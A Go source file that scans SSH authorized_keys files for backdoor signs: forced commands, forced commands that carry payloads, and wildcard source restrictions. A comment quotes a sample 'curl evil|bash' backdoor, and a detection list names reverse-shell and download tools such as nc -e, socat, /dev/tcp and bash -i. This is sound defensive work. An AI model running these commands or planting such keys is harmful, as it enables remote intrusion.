package filewatch

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"strings"
)

// authorizedKeyFinding is the result of inspecting an authorized_keys
// line. Empty Reason means nothing notable.
type authorizedKeyFinding struct {
	Reason      string // short tag for the event field
	Key         string // first ~40 chars of the public key (for fingerprint context)
	Fingerprint string // sha256 fingerprint over the full key blob
	Comment     string
	Snippet     string // up to ~120 chars of the offending line
}

// scanAuthorizedKeys reads an authorized_keys file and returns the most
// suspicious-looking entry, if any. Heuristics:
//   - Forced commands (`command="..."`) — classic backdoor where the
//     key runs `curl evil|bash` on every login.
//   - command="..." + curl/wget/base64/dev_tcp content — extra-critical.
//   - `from=*` wildcards — too permissive, attackers like these.
//
// We don't fail the install on these — we surface them so the user can
// decide. A handful of real users do use `command=` for legit forced
// rsync / borg backups; that's a one-tap dismiss in Telegram.
func scanAuthorizedKeys(path string) authorizedKeyFinding {
	f, err := os.Open(path)
	if err != nil {
		return authorizedKeyFinding{}
	}
	defer f.Close()

	s := bufio.NewScanner(f)
	s.Buffer(make([]byte, 64*1024), 256*1024)
	for s.Scan() {
		line := s.Text()
		trim := strings.TrimSpace(line)
		if trim == "" || strings.HasPrefix(trim, "#") {
			continue
		}
		if r := inspectKeyLine(trim); r.Reason != "" {
			return r
		}
	}
	return authorizedKeyFinding{}
}

// inspectKeyLine examines one authorized_keys line. The format is:
//
//	[options ]ssh-{rsa,ed25519,ecdsa,...} BASE64 [comment]
//
// where `options` is a comma-separated key=value list. We look for the
// classic backdoor patterns inside the options block.
func inspectKeyLine(line string) authorizedKeyFinding {
	// Find the key-type token: it's the first space-separated field that
	// starts with "ssh-" or "ecdsa-sha2-".
	keyTypeIdx := findKeyTypeIndex(line)
	options := ""
	rest := line
	if keyTypeIdx > 0 {
		options = strings.TrimSpace(line[:keyTypeIdx])
		// strip trailing comma if present
		options = strings.TrimRight(options, ",")
		rest = line[keyTypeIdx:]
	}

	keyBlob, comment := splitKeyAndComment(rest)
	fp := fingerprint(keyBlob)

	if options == "" {
		return authorizedKeyFinding{}
	}

	low := strings.ToLower(options)
	snippet := options
	if len(snippet) > 120 {
		snippet = snippet[:117] + "..."
	}

	// Most damning: forced command containing a payload-fetch.
	if cmd, ok := extractCommand(options); ok {
		clow := strings.ToLower(cmd)
		// Pad with spaces so a substring match enforces word boundaries —
		// otherwise "nc -" would match inside "rsync --server".
		padded := " " + clow + " "
		dangerous := containsAny(padded,
			" curl ", " curl|", " curl -",
			" wget ", " wget|", " wget -",
			" base64 ",
			"/dev/tcp/",
			" nc -e", " nc -c",
			" ncat ",
			" socat ",
			"/tmp/", "/var/tmp/", "/dev/shm/",
			" python -c", " python3 -c",
			" perl -e",
			" bash -i", " sh -i",
		)
		reason := "forced_command"
		if dangerous {
			reason = "forced_command_payload"
		}
		return authorizedKeyFinding{
			Reason:      reason,
			Key:         truncate(keyBlob, 40),
			Fingerprint: fp,
			Comment:     comment,
			Snippet:     snippet,
		}
	}

	// from="*" or from=0.0.0.0/0 → wide-open key
	if from, ok := extractOption(options, "from"); ok {
		flow := strings.ToLower(from)
		if flow == "*" || strings.Contains(flow, "0.0.0.0/0") || strings.Contains(flow, "::/0") {
			return authorizedKeyFinding{
				Reason:      "from_wildcard",
				Key:         truncate(keyBlob, 40),
				Fingerprint: fp,
				Comment:     comment,
				Snippet:     snippet,
			}
		}
	}

	// no-port-forwarding etc are normal and even reassuring; we don't flag those.
	_ = low

	return authorizedKeyFinding{}
}

func findKeyTypeIndex(line string) int {
	for _, prefix := range []string{"ssh-rsa ", "ssh-ed25519 ", "ssh-dss ", "ecdsa-sha2-nistp256 ", "ecdsa-sha2-nistp384 ", "ecdsa-sha2-nistp521 ", "sk-ecdsa-sha2-nistp256@openssh.com ", "sk-ssh-ed25519@openssh.com "} {
		if i := strings.Index(line, prefix); i >= 0 {
			return i
		}
	}
	return -1
}

// splitKeyAndComment takes "ssh-rsa AAAA... user@host" and returns the
// AAAA... blob plus the trailing comment.
func splitKeyAndComment(rest string) (key, comment string) {
	fields := strings.Fields(rest)
	if len(fields) >= 2 {
		key = fields[1]
	}
	if len(fields) >= 3 {
		comment = strings.Join(fields[2:], " ")
	}
	return
}

// extractCommand returns the value of the command="..." option if any.
// Honors backslash-escaped quotes inside the value.
func extractCommand(opts string) (string, bool) {
	return extractOption(opts, "command")
}

// extractOption returns the value of `<key>="..."` from a comma-
// separated options list. Returns "" if not found.
func extractOption(opts, key string) (string, bool) {
	low := strings.ToLower(opts)
	needle := key + "=\""
	i := strings.Index(low, needle)
	if i < 0 {
		return "", false
	}
	start := i + len(needle)
	// Find the closing quote, allowing for backslash escapes.
	for j := start; j < len(opts); j++ {
		if opts[j] == '\\' && j+1 < len(opts) {
			j++
			continue
		}
		if opts[j] == '"' {
			return opts[start:j], true
		}
	}
	return "", false
}

// fingerprint returns the hex-truncated SHA-256 of the base64 key blob.
// Not a "real" SSH fingerprint (which is sha256 of the decoded blob),
// but stable for "is this the same key I saw before?" comparisons.
func fingerprint(keyBlob string) string {
	if keyBlob == "" {
		return ""
	}
	sum := sha256.Sum256([]byte(keyBlob))
	return hex.EncodeToString(sum[:8]) // 16 hex chars
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// containsAny reports whether haystack contains any of the needles.
func containsAny(haystack string, needles ...string) bool {
	for _, n := range needles {
		if strings.Contains(haystack, n) {
			return true
		}
	}
	return false
}
